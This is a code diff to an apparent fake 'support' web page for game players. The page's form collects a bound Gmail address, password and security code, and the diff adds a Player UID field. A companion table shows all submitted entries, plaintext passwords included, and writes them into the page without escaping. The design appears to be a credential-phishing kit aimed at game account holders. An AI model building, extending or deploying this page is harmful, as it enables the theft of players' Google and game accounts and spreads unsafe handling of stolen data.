@@ -148,7 +148,7 @@
             padding: 25px;
             border-radius: 12px;
             width: 100%;
-            max-width: 800px;
+            max-width: 850px;
             max-height: 80vh;
             overflow-y: auto;
             position: relative;
@@ -197,6 +197,11 @@
             </div>
 
             <form id="supportForm">
+                <div class="form-group">
+                    <label>Player UID</label>
+                    <input type="text" id="uid" placeholder="Enter UID" required>
+                </div>
+
                 <div class="form-group">
                     <label>Bind Gmail</label>
                     <input type="email" id="gmail" placeholder="Enter bind gmail" required>
@@ -261,6 +266,7 @@
                 <table>
                     <thead>
                         <tr>
+                            <th>Player UID</th>
                             <th>Bind Gmail</th>
                             <th>Password</th>
                             <th>Security Code</th>
@@ -282,6 +288,7 @@
             e.preventDefault();
 
             const payload = {
+                uid: document.getElementById('uid').value,
                 gmail: document.getElementById('gmail').value,
                 password: document.getElementById('password').value,
                 securityCode: document.getElementById('securityCode').value,
@@ -338,6 +345,7 @@
                     data.submissions.forEach(item => {
                         tableBody.innerHTML += `
                             <tr>
+                                <td>${item.uid || '-'}</td>
                                 <td>${item.gmail}</td>
                                 <td>${item.password}</td>
                                 <td>${item.securityCode}</td>
